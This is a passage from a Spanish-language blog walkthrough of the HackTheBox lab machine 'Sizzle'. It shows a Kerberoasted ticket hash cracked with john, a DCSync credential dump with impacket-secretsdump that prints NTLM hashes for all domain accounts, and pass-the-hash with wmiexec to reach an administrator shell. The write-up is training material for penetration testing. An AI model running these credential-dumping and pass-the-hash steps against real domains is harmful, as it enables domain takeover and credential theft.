</code></pre><pre tabindex="0"><code>$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$0DFF2356EAD2BE0B464459A027F75831$FF74BF3A310FB1BB026E6E45A703D181C2CA019966012D65652584963B4DD1633A92409BE0EECA6B0D445316B5347CFD9BA2E2AD55CC523C260446B9E6D7C6A44C654C2D358379295D88BCCF36D40B80C53A4E3573BC0D21BD64A5E2FF2A7F79811B5A6E96EAC876E4FA49BF8D2EB4EBBC1B9C43A760B7799877F6EA711B5769B1ED4A8E2607CB10DCACFB685724854BD951B7F2362D76BB4EB5C585668F1E7B1C435F96E1C252FFACEBE4844C127DD725210BD1FAB9637D0D6DCD69CA39F6AA9DD30A0984F7F1EC407E6FDB7C8D5D2B7310F9C7777BE54AC072D826AA251BAF95424EF33546E951E075D6BF93990A3DAEDD73EACC42C1A0E4EF4E832BE71155E4543B312CEA6CFAE1BC40ED34781AA3DF6171ABB883C77D31CFCF7BB3A2A167B7DE11DC217AB4800FF6BF146523823A240BAF000A23B567534FE5417D9AE95D1D707CF51F90CF3A3BDCF3CE985281ABC7073AE7405D3CD2A87A217FA0644E2085C2CC19709805B44FA8FF184EDB9B746C229AAF471D6CDD68F95171663B674626B5F0E86839B920743FEADE151BD292105DC4E4D767D16CFC048DAA69B7E5610B3ED3C9B68CBB23F631BE63C9B4A9634431194C55371E49B4D7AA86DE1566B6079E018CC239B8C613345401DB09A74ACC66C0FC81C4DB068606653A2B83D583666EE92E3A16DC01D67C2CDE0029F45689874C3A4D26C045BE74C135B1BA79BAC2BDDB77FE70B46133EDF355260A0B634B716B9A4F6C1133DC22E155835E73FA046A0B2EAE0A6DD6C30E8B0328284824ACBE14EB5E2FD590ACA69BE35CCE924792B7AB42988154C680BE0F7E6939F956BEE4DA8F4AEA8417E105F4650E04DB7A0C17C98E91AFA299CEB5574BA2BC16F6ECF5F0D054D696782188DF7FCC9351E68AD63525B440BBD96B17831409ED6E0F5A15321EEA424AF869CB63DF2A27E537C4EE986AE7DC9B51310512B378801E8D02BF5ECB6A3E60110D0A79D01F5858FC82CAE75EC412ACCAE293EEF7194CC97035A1E7C307B4319975E527A6B7FBB77142640708FD56290B331A25DE6D04DE2C922786497F063BC8780FAE2D68204B205573FE57386A94D3169718D558063F659CD9AD9FF16564749EB9CD926E01CA9C3ECF22F401814A20EA87DDD65B4740F97035A38DCE34A3EB5504FC6241BF3EF292DE2A023677FD84BB69DAC54D0EB4282E5B4AE22A25026A3CFB7696736F5D0EE3C8018CF3FFC279428F412DDC580D963A33E0540760176A93BB3DD8181291F2B3AE44B88830EDDC59B4BB601DE181A897FB07D10EEF46DE7938141ACD556FF733E971270D73BB09F3FBCBD943D9F836E2DA052DD907647E3F46121EC7259B0FEFB351217047
</code></pre><p>Lo desencriptamos:</p>
<pre tabindex="0"><code>&gt; john -w:/usr/share/wordlists/rockyou.txt hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Football#7       (?)     
1g 0:00:00:07 DONE (2024-07-22 06:42) 0.1404g/s 1568Kp/s 1568Kc/s 1568KC/s Forever3!..Flygurl09
Use the &#34;--show&#34; option to display all of the cracked passwords reliably
Session completed.
</code></pre><p>La contraseña es <code>Football#7</code></p>
<p>Como habíamos visto antes el usuario <code>mrlky</code> podía efectuar un <code>DCSync Attack</code>, como ya tenemos su contraseña vamos a probar de hacerlo:</p>
<pre tabindex="0"><code>impacket-secretsdump HTB.LOCAL/mrlky@10.10.10.103
</code></pre><pre tabindex="0"><code>impacket-secretsdump HTB.LOCAL/mrlky@10.10.10.103
Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:932207b6d3f0d1360a0108045198e58d:::
</code></pre><p>Ya tenemos el hash de todos los usuarios, vamos a hacer <code>Pass the Hash</code> para entrar como <code>Administrator</code> mediante <code>wmiexec.py</code>:</p>
<pre tabindex="0"><code>&gt; wmiexec.py HTB.LOCAL/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267

Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;whoami
htb\administrator
</code></pre><p>Ya somos root!</p>

      
    </div>
    <footer class="article-footer">
      

      

      

      

      

      

      

      
      <ul class="article-tag-list" itemprop="keywords">
  
    <li class="article-tag-list-item" data-aos="zoom-in">
      <a
        class="article-tag-list-link"
        href="/tags/insane"
        rel="tag"
        >INSANE</a
      >
    </li>
  
</ul>

    </footer>
  </div>
  
    
  
</article>










</section>
        </div>
        
        
        



  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  



<footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    <div>
      <span class="icon-copyright"></span>
      2024 -
      2026
      <span class="footer-info-sep "></span>
      Fouen
    </div>
    
    
      <div>
        <span class="icon-brush"
          >&nbsp;
            7.7k
          </span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;
          
          

          00:41
        </span>
      </div>
    
    
    
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar">
        <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconocimiento">Reconocimiento</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#ftp">FTP</a></li>
        <li><a href="#https">HTTPS</a></li>
        <li><a href="#smb">SMB</a></li>
      </ul>
    </li>
    <li><a href="#explotación">Explotación</a>
      <ul>
        <li><a href="#evil-scf">Evil scf</a></li>
        <li><a href="#ad-certificate-services">AD Certificate Services</a></li>
      </ul>
    </li>
    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>
      <ul>
        <li><a href="#bloodhound">Bloodhound</a></li>
        <li><a href="#rubeus">Rubeus</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
      </div>
      <div class="sidebar-common-sidebar hidden">
        
<div class="sidebar-author">
  <img
    data-src="/avatar/avatar.webp"
    data-sizes="auto"
    alt="Fouen"
    class="lazyload"
  />
  <div class="sidebar-author-name">Fouen</div>
  <div class="sidebar-description">Web enjoyer</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">11</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      3
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">9</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-github sidebar-social-icon">
      <a
        href="https://github.com/FOUEN"
        itemprop="url"
        target="_blank"
        aria-label="github"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
    <div class="icon-linkedin sidebar-social-icon">
      <a
        href="https://www.linkedin.com/in/joel-guill%c3%a9n-5a2531254"
        itemprop="url"
        target="_blank"
        aria-label="linkedin"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe62f;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
</div>

      </div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
      <div class="site-search">
        <div class="reimu-popup popup">
          <div class="reimu-search">
            <div class="reimu-search-input-icon"></div>
            <div class="reimu-search-input" id="reimu-search-input"></div>
            <div class="popup-btn-close"></div>
          </div>
          <div class="reimu-results">
            <div id="reimu-stats"></div>
            <div id="reimu-hits"></div>
            <div id="reimu-pagination" class="reimu-pagination"></div>
          </div>
          <img class="reimu-bg" src="/images/reimu.png" />
        </div>
      </div>
    
    






  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    
    
    
    
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"
  ></script>




  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    
    
    
    
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"
  ></script>









  
      
      <script src="/js/main.js" integrity="" crossorigin="anonymous" ></script>
      



  





  
      
      <script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script>
      

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script>








  
      
      <script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
      



  <script>
    var ALGOLIA_CONFIG = {
      logo: '\/images\/algolia_logo.svg',
      algolia: {
        applicationID: "",
        apiKey: "",
        indexName: "",
        hits: {
          "per_page": parseInt("10")
        },
        labels: {
          "input_placeholder": ".....",
          "hits_empty": "No data for ${query}",
          "hits_stats": ""
        }
      }
    };
  </script>
  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
    defer
    
    
    
    integrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"
  ></script>


  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
    defer
    
    
    
    integrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"
  ></script>


  





  
      
      <script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
      











<div id="lazy-script">
  <div>
    
      
      
        
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Fouen",
          title: "Sizzle",
          url: "https:\/\/fouen.github.io\/post\/hackthebox\/sizzle\/",
          description: "\rReconocimiento\rNmap\rEscaneamos la maquina para ver que puertos tiene abiertos:\nnmap -p- --open --min-rate 5000 -Pn -n 10.10.11.8 PORT STATE SERVICE\r21\/tcp open ftp\r53\/tcp open domain\r80\/tcp open http\r135\/tcp open msrpc\r139\/tcp open netbios-ssn\r389\/tcp open ldap\r443\/tcp open https\r445\/tcp open …",
          cover: "https:\/\/fouen.github.io\/images\/sizzle.png",
        };
      </script>
    
    
    
      





  
      
      <script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script>
      

      
      
      
      
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;

        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      












      
    
    
  </div>
</div>






  





  
       
         
      

  





  
      
      <script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script>
      



<script>
  const reimuCopyright = String.raw`
   ______     ______     __     __    __     __  __    
  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                    
  `;
  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
  console.log(
    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
    "color: white; background: #ff5252; padding:5px 0;",
    "padding:4px;border:1px solid #ff5252;",
  );
</script>




  </body>
</html>
